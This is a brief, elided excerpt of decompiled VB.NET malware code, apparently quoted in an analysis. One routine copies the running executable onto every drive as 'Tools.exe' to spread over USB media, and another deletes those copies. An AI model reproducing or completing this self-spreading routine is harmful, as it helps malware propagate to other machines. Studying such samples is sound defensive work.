        ...
        Public Shared Sub ko()
            ...
            If OK.USB_SP Then
                ...
                For Each drivers In driver
                    Try
                        If System.IO.File.Exists(drivers & "Tools.exe") = False Then
                            System.IO.File.Copy(System.Reflection.Assembly.
        GetExecutingAssembly.Location, drivers & "Tools.exe")
                        End If
...
Label_01C1:
        ...
        Public Shared Sub UNS()
            ...
            For Each drivers In driver
                Try
                    If System.IO.File.Exists(drivers & "Tools.exe") = True Then
                        System.IO.File.Delete(drivers & "Tools.exe")
                    End If
                Catch
                End Try
            Next
